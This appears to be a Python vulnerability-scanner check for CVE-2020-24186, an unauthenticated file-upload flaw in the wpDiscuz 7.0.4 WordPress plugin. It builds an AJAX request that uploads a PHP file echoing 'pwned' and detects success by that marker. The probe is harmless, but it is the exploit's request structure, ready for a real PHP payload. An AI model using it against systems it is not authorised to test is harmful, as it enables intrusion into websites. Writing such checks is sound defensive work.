"""
wpDiscuz 7.0.4 (CVE-2020-24186) - Remote Code Execution
Description: RCE via unauthenticated AJAX upload (wmuUploadFiles action)
Severity: Critical
CVSS Score: 9.8
Affected Versions: wpDiscuz 7.0.4
Reference: https://www.exploit-db.com/exploits/49967
"""

def get_payload():
    return {
        'path': '/wp-admin/admin-ajax.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'multipart/form-data'
        },
        'files': {
            'wmu_files[]': ('test.php', '<?php echo "pwned"; ?>', 'application/x-php')
        },
        'data': {
            'action': 'wmuUploadFiles',
            'wmu_nonce': 'test_nonce',
            'wmu_post_id': '1'
        }
    }

def check_response(response):
    return response.status_code == 200 and 'pwned' in response.text 